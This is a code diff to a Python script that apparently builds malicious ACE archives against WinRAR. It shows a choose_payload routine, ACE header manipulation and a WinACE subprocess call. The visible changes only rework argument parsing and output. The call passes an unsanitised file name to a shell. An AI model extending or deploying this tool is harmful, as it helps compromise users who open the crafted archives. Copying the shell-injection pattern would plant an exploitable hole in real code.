@@ -8,9 +8,7 @@ import binascii
 import subprocess
 import zlib 
 import sys 
-import getopt
-
-winace_path = '"C:\\Program Files (x86)\\WinAce\\winace.exe"'
+import argparse
 
 class AceCRC32:
     """
@@ -147,16 +145,20 @@ def choose_payload():
                 continue
 
 def usage():
-    print("Creating an ACE archive is protected by a patent. The only software that is allowed to create an ACE archive is WinACE.")
-    print("Please include WinACE executable in the arguments:")
-    print("ezwinrar -w \\path\\to\\WinAce\\winace.exe")
+    use = """Creating an ACE archive is protected by a patent. The only software that is allowed to create an ACE archive is WinACE.
+        Please include WinACE executable in the arguments:
+        ezwinrar -w \\path\\to\\WinAce\\winace.exe (default: C:\\Program Files (x86)\\WinAce\\winace.exe)
+        """
+    return use
 
 def main(argv):
-    try:
-        opts, args = getopt.getopt(argv, "w", ["winace"])
-    except getopt.GetoptError:
-        usage()
-        sys.exit(2)
+
+    parser = argparse.ArgumentParser()
+    parser.add_argument("winace", default='"C:\\Program Files (x86)\\WinAce\\winace.exe"', nargs="?", help=usage())
+    args = parser.parse_args()
+    winace_path = args.winace
+    
+    print(winace_path)
 
     sfile = input("Choose a file: ")
 
@@ -168,6 +170,8 @@ def main(argv):
     p = subprocess.Popen("{} a -y step1 {}".format(winace_path, sfile), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 
     out, err = p.communicate()
+
+    print("out:{}\r\nerr:{}".format(out,err))
 
     with open("step1.ace","rb") as f1:
         first_part = f1.read(0x35)
@@ -215,3 +219,6 @@ def main(argv):
         os.remove("step1.ace")
     except:
         pass
+
+if __name__ == "__main__":
+    main(sys.argv[1:])
